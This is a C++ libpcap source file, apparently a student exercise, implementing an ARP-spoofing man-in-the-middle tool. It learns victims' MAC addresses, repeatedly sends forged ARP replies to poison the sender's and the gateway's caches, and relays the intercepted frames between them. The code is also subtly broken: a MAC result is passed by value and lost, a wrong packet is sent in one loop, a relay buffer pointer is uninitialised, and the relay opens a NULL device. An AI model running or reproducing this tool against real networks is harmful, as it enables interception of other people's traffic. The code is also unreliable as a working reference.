#include <cstdio>
#include <unistd.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <ifaddrs.h>
#include <netinet/in.h> // for ntoh
#include <netinet/ether.h> // for ether_ntoa

#pragma pack(push, 1)
#define ETHER_ADDR_LENGTH	6
#define SIZE_ETHERNET 14
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};


typedef struct {
    char* dev_;
} Param;

Param param  = {
    .dev_ = NULL
};


/* Ethernet header */
typedef struct EthernetHeader{
    u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
    u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
    u_short ether_type; /* IP? ARP? RARP? etc */
} EthernetHeader;

struct arpHeader {
    u_short arp_htype; /*hardware type*/
    u_short arp_p; /*protocol*/
    u_char arp_hsize; /*hardware size*/
    u_char arp_psize; /*protocol size*/
    u_short arp_opcode; /*opcode*/
    u_char arp_smhost[6]; /*sender mac address*/
    struct in_addr arp_sip; /*sender ip address*/
    u_char arp_dmhost[6]; /*target mac address*/
    struct in_addr arp_dip; /*target ip address*/
};
#pragma pack(pop)


void usage() {
    printf("syntax: pcap-test <interface>\n");
    printf("sample: pcap-test wlan0\n");
}

void MAC_uchar2Str(unsigned char* data, std::string * parsedString)
    {
            snprintf((char*)parsedString->c_str(), sizeof(char[17]), "%x:%x:%x:%x:%x:%x", data[0], data[1], data[2], data[3], data[4], data[5]);
    }

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

int getMACFromReply(const char* ens33, std::string victimIP, std::string victimMAC) {   // ens33,

    char str[INET_ADDRSTRLEN];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(ens33, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", ens33, errbuf);
        return -1;
    }

    const struct EthernetHeader *ethernet; /* The ethernet header */
    const struct arpHeader *arp; /* The IP header */
    struct pcap_pkthdr* header;
    const u_char* packet;

    int res =0;
    int flag = 0;
//    for (int i = 0; i<50; i++) {
    while(true) {
        res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        ethernet = (struct EthernetHeader*) packet;
        arp = (struct arpHeader*)(packet + SIZE_ETHERNET);
        inet_ntop(AF_INET, &(arp->arp_sip), str, INET_ADDRSTRLEN);
        if ((ntohs(ethernet->ether_type) == 0x0806) && (victimIP == str)) {    // arp and TCP
            victimMAC = ether_ntoa((struct ether_addr *)ethernet->ether_shost);
            flag = 1;
            break;
        }
    }
    pcap_close(pcap);
    return 1;
}


void makeARPPacket(EthArpPacket * pPacket,
                   const std::string eth_dmac,
                   const std::string eth_smac,
                   uint16_t arp_oper,
                   const std::string arp_smac,
                   const std::string arp_sip,
                   const std::string arp_tmac,
                   const std::string arp_tip) {
    pPacket->eth_.dmac_ = Mac(std::string(eth_dmac));   // broadcast
    pPacket->eth_.smac_ = Mac(std::string(eth_smac));   // PC MAC
    pPacket->eth_.type_ = htons(EthHdr::Arp);

    pPacket->arp_.hrd_ = htons(ArpHdr::ETHER);
    pPacket->arp_.pro_ = htons(EthHdr::Ip4);
    pPacket->arp_.hln_ = Mac::SIZE;
    pPacket->arp_.pln_ = Ip::SIZE;
    pPacket->arp_.op_ = htons(arp_oper);
    pPacket->arp_.smac_ = Mac(arp_smac);   // PC mac
    pPacket->arp_.sip_ = htonl(Ip(arp_sip));    // pc IP
    pPacket->arp_.tmac_ = Mac(arp_tmac);   // gw mac
    pPacket->arp_.tip_ = htonl(Ip(arp_tip));   // gw ip
}

int main(int argc, char* argv[]) {
    int ipset = (argc - 2)/2;
    char* dev = argv[1];            //ens33
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    struct ifaddrs *id;
    int val = getifaddrs(&id);

    pid_t c_pid;

// parent process
// 1. sender and target ARP infection
    // (1.1) find my network info : MAC,IP
    std::string myIP ;
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    if(s ==-1) {
        printf("my mac fail : socket fail\n");
        return -1;
    }
    strcpy(ifr.ifr_name, dev);
    if (0 != ioctl(s, SIOCGIFHWADDR, &ifr)) {
        printf("my mac fail : ioctl func\n");
        return -1;
    }

    struct ether_addr* myMACeth = (struct ether_addr*)ifr.ifr_hwaddr.sa_data;
    std::string myMAC = ether_ntoa((struct ether_addr*)ifr.ifr_hwaddr.sa_data);

    if (0 != ioctl(s, SIOCGIFADDR, &ifr)) {
        printf("my IP fail : ioctl `func\n");
        return -1;
    }
    // strcpy(myIP, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));
    myIP = inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);


    EthArpPacket pPacket, pPacket2, pPacket3;
    std::string senderIP;
    std::string targetIP;
    std::string senderIPset[ipset];
    std::string targetIPset[ipset];
    std::string senderMACset[ipset];
    std::string targetMACset[ipset];
    std::string senderMAC = "ff:ff:ff:ff:ff:ff";
    std::string targetMAC = "ff:ff:ff:ff:ff:ff";

    for (int i = 0; i<ipset; i++){
        senderIPset[i] = argv[i*2 + 2];
        targetIPset[i] = argv[i*2 + 1 + 2];
    }



    for (int i = 0; i<ipset; i++){
        senderIP = argv[i*2 + 2];
        targetIP = argv[i*2 + 1 + 2];
        // (1.2) acquire sender's MAC address : send arp request
        pPacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // broadcast
        pPacket.eth_.smac_ = Mac(myMAC);   // PC MAC
        pPacket.eth_.type_ = htons(EthHdr::Arp);

        pPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
        pPacket.arp_.pro_ = htons(EthHdr::Ip4);
        pPacket.arp_.hln_ = Mac::SIZE;
        pPacket.arp_.pln_ = Ip::SIZE;
        pPacket.arp_.op_ = htons(ArpHdr::Request);
        pPacket.arp_.smac_ = Mac(myMAC);   // PC mac
        pPacket.arp_.sip_ = htonl(Ip(myIP));    // pc IP
        pPacket.arp_.tmac_ = Mac("00:00:00:00:00:00");   // unknown sender mac
        pPacket.arp_.tip_ = htonl(Ip(senderIP));   // sender ip

        int res = 0;
        int result = 0;
        // for(int j = 0; j<100; j++){
        while(true) {
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pPacket), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, " arp request: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }

        // (1.3) parse the arp reply for MAC address
            result = getMACFromReply(dev, senderIP, senderMAC);
            if (result == -1) {
                printf("error : getMACFromReply\n");
            }
            if (result == 1) {
                break;
            }
            sleep(2);
        }

        // (1.4) acquire target's MAC address : send arp request
        pPacket3.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");   // broadcast
        pPacket3.eth_.smac_ = Mac(myMAC);   // PC MAC
        pPacket3.eth_.type_ = htons(EthHdr::Arp);

        pPacket3.arp_.hrd_ = htons(ArpHdr::ETHER);
        pPacket3.arp_.pro_ = htons(EthHdr::Ip4);
        pPacket3.arp_.hln_ = Mac::SIZE;
        pPacket3.arp_.pln_ = Ip::SIZE;
        pPacket3.arp_.op_ = htons(ArpHdr::Request);
        pPacket3.arp_.smac_ = Mac(myMAC);   // PC mac
        pPacket3.arp_.sip_ = htonl(Ip(myIP));    // pc IP
        pPacket3.arp_.tmac_ = Mac("00:00:00:00:00:00");   // unknown sender mac
        pPacket3.arp_.tip_ = htonl(Ip(targetIP));   // target ip

        while(true) {
            res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pPacket), sizeof(EthArpPacket));
            if (res != 0) {
                fprintf(stderr, " arp request: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }

        // (1.5) parse the arp reply for MAC address
            result = getMACFromReply(dev, targetIP, targetMAC);
            if (result == -1) {
                printf("error : getMACFromReply - target\n");
            }
            if (result == 1) {
                break;
            }
            sleep(2);
        }
        senderMACset[i] = senderMAC;
        targetMACset[i] = targetMAC;
    }

    printf("fork\n");
    c_pid = fork();

    if (c_pid == -1) {
        perror("fork");
        return -1;
    }
    else if (c_pid == 0) {
// parent thread
// send infector
        while(true){
            for(int i=0; i<ipset; i++){
                senderMAC = senderMACset[i];
                targetMAC = targetMACset[i];
                senderIP = senderIPset[i];
                targetIP = targetIPset[i];

                // (1.6) attack sender by sending arp reply with gateway IP and my MAC address
                pPacket2.eth_.dmac_ = Mac(senderMAC);   // phone MAC
                pPacket2.eth_.smac_ = Mac(myMAC);   // PC MAC
                pPacket2.eth_.type_ = htons(EthHdr::Arp);

                pPacket2.arp_.hrd_ = htons(ArpHdr::ETHER);
                pPacket2.arp_.pro_ = htons(EthHdr::Ip4);
                pPacket2.arp_.hln_ = Mac::SIZE;
                pPacket2.arp_.pln_ = Ip::SIZE;
                pPacket2.arp_.op_ = htons(ArpHdr::Reply);
                pPacket2.arp_.smac_ = Mac(myMAC);   // PC mac
                pPacket2.arp_.sip_ = htonl(Ip(targetIP));    // gw IP
                pPacket2.arp_.tmac_ = Mac(senderMAC);   // phone mac
                pPacket2.arp_.tip_ = htonl(Ip(senderIP));   // phone ip

                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pPacket2), sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "arp reply : pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }

                // (1.7) attack target by sending arp reply with sender IP and my MAC address
                pPacket2.eth_.dmac_ = Mac(targetMAC);   // gw MAC
                pPacket2.eth_.smac_ = Mac(myMAC);   // PC MAC
                pPacket2.eth_.type_ = htons(EthHdr::Arp);

                pPacket2.arp_.hrd_ = htons(ArpHdr::ETHER);
                pPacket2.arp_.pro_ = htons(EthHdr::Ip4);
                pPacket2.arp_.hln_ = Mac::SIZE;
                pPacket2.arp_.pln_ = Ip::SIZE;
                pPacket2.arp_.op_ = htons(ArpHdr::Reply);
                pPacket2.arp_.smac_ = Mac(myMAC);   // PC mac
                pPacket2.arp_.sip_ = htonl(Ip(senderIP));    // phone IP
                pPacket2.arp_.tmac_ = Mac(targetMAC);   // gw mac
                pPacket2.arp_.tip_ = htonl(Ip(targetIP));   // gw ip

                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pPacket2), sizeof(EthArpPacket));
                if (res != 0) {
                    fprintf(stderr, "arp reply : pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                }
            }
            sleep(4); // 2 sec
        }
        //pcap_close(handle);
    }

    else if (c_pid > 0){
// child process
// 2. packet relay
        printf("child thrd\n");
        int ipset = (argc - 2)/2;
        std::string senderIPset[ipset];
        std::string targetIPset[ipset];
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);             // open live
        if (pcap == NULL) {
            fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
            return -1;
        }
        for (int i = 0; i<ipset; i++){
            senderIPset[i] = argv[i*2 + 2];
            targetIPset[i] = argv[i*2 + 1 + 2];
        }

        while (true) {
            const struct EthernetHeader *ethernet; /* The ethernet header */
            struct pcap_pkthdr* header;
            struct EthernetHeader *sendEther;
            const u_char* packet;
            u_char* sendPacket;

            int res = pcap_next_ex(pcap, &header, &packet);                         // listen
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                break;
            }
            int length = header->len;
            memcpy(sendPacket, packet, (size_t)length);

            ethernet = (struct EthernetHeader*) packet;

            std::string srcMACStr;
            int flag = 0;
            int index = 0;
            MAC_uchar2Str((unsigned char *)(ethernet->ether_shost), &srcMACStr);

            for(int i=0; i < ipset; i++) {
                if (memcmp((uint8_t*)Mac(ethernet->ether_shost) , (uint8_t*)Mac((std::string)senderMACset[i]),6) == 0) {     // packet is from sender
                    flag = 1;
                    index = i;
                    break;
                }
                if (memcmp((uint8_t*)Mac(ethernet->ether_shost) , (uint8_t*)Mac((std::string)targetMACset[i]),6) == 0) {     // packet is from target
                    flag = 2;
                    index = i;
                    break;
                }
            }

            //ethernet = (struct EthernetHeader*) packet;
            sendEther = (struct EthernetHeader*) sendPacket;

            if (flag == 1) {                            // packet is from sender
                // Ethernet header : src mac / dst mac
                memcpy(sendEther->ether_shost, myMACeth->ether_addr_octet, 6);                  // shost = my mac
                memcpy(sendEther->ether_dhost, (unsigned char *)Mac(targetMACset[index]), 6);   // thost = target mac

                res = pcap_sendpacket(pcap, sendPacket, length);
                if (res != 0) {
                    printf("pcap_sendpacket(from target) return %d(%s)\n", res, pcap_geterr(pcap));
                    break;
                }
            }

            else if(flag == 2) {                        // packet is from target
                // Ethernet header : src mac / dst mac
                memcpy(sendEther->ether_shost, myMACeth->ether_addr_octet, 6);  // shost = my mac
                memcpy(sendEther->ether_dhost, (unsigned char *)Mac(senderMACset[index]), 6); // thost = target mac

                res = pcap_sendpacket(pcap, sendPacket, length);
                if (res != 0) {
                    printf("pcap_sendpacket(from target) return %d(%s)\n", res, pcap_geterr(pcap));
                    break;
                }
            }
            else {
                continue;
            }
        }

        pcap_close(pcap);

    }
}
